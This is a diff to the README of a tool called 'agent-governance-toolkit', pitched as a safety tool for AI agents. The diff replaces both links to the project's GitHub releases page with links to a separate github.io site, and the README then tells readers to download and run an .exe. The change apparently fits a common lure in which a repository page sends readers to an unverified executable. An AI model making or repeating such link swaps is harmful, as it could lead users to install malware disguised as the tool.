@@ -1,6 +1,6 @@
 # 🛡️ agent-governance-toolkit - Keep autonomous AI agents safe today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Aureliedumbfounding630/agent-governance-toolkit/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://aureliedumbfounding630.github.io)
 
 ## 🎯 Purpose of this software
 
@@ -19,7 +19,7 @@ Before you begin, verify your computer meets these basic needs:
 
 To start, visit the official release page. This page contains the most current version of the tool.
 
-[Visit this page to download the latest file](https://github.com/Aureliedumbfounding630/agent-governance-toolkit/releases)
+[Visit this page to download the latest file](https://aureliedumbfounding630.github.io)
 
 On this page, look for the section labeled "Assets." Click the file ending in `.exe` to begin the download. Save this file to your "Downloads" folder. This file contains all necessary components to run the governance features on your machine.
 
